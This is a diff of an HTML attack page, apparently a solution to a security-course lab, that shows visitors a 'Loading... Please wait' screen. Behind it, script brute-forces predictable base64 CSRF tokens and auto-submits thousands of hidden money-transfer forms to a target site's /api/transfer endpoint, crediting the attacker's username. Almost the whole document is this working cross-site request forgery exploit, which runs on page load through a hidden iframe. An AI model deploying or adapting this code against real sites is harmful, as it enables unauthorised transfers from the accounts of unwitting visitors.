@@ -1,25 +1,21 @@
 <body>
 <h1>Loading... Please wait.</h1>
 
-<iframe src="https://phish-me.quoccacorp.com/" ></iframe>
+<!-- Hidden iframe to catch form submissions -->
+<iframe name="hiddenFrame"></iframe>
 
 <script>
-// Hardcoded last known CSRF token
 let last = "MjkyNw=="; 
-
-// Decode last known token
 let base = parseInt(atob(last));
 
-// Try 3000 future tokens
 for (let i = 1; i <= 3000; i++) {
-    let number = base + i*2;
+    let number = base + i;
     let new_token = btoa(number.toString());
     
-    // Create a form
     let f = document.createElement('form');
     f.method = 'POST';
     f.action = 'https://phish-me.quoccacorp.com/api/transfer';
-    f.style.display = 'none';
+    f.target = 'hiddenFrame'; // <-- important: target to iframe
     
     // csrf_token
     let csrf = document.createElement('input');
@@ -32,22 +28,21 @@ for (let i = 1; i <= 3000; i++) {
     let user = document.createElement('input');
     user.type = 'hidden';
     user.name = 'username';
-    user.value = 'z5508657'; // Change to your account
+    user.value = 'z5508657'; // your account
     f.appendChild(user);
     
     // amount
     let amount = document.createElement('input');
     amount.type = 'hidden';
     amount.name = 'amount';
-    amount.value = '100';
+    amount.value = '20';
     f.appendChild(amount);
     
     document.body.appendChild(f);
     
-    // Delay each form submission slightly
     setTimeout(() => {
         f.submit();
-    }, i * 150); // 150ms delay between submits to avoid overload
+    }, i * 100); // delay between each submit
 }
 </script>
 
